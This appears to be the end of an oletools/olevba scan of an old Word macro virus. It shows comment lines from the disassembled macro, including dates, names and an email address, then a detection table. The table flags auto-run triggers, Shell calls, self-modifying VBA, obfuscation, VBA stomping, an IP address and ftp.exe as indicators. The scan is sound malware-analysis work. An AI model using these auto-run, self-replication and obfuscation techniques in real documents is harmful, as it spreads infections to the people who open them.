' 	QuoteRem 0x0000 0x0000 ""
' Line #239:
' Line #240:
' Line #241:
' Line #242:
' 	QuoteRem 0x0000 0x0022 " 12:14:27 PM - Friday, 19 Mar 1999"
' Line #243:
' 	QuoteRem 0x0000 0x0006 " Avert"
' Line #244:
' 	QuoteRem 0x0000 0x0000 ""
' Line #245:
' Line #246:
' Line #247:
' Line #248:
' 	QuoteRem 0x0000 0x0024 " 02:35:57 odp. - pondělí, 14 VI 1999"
' Line #249:
' 	QuoteRem 0x0000 0x0005 " Lena"
' Line #250:
' 	QuoteRem 0x0000 0x0022 " Kontakt: rincewind_mg@hotmail.com"
' Line #251:
' Line #252:
' Line #253:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |209.201.88.110      |IPv4 address                                 |
|IOC       |ftp.exe             |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

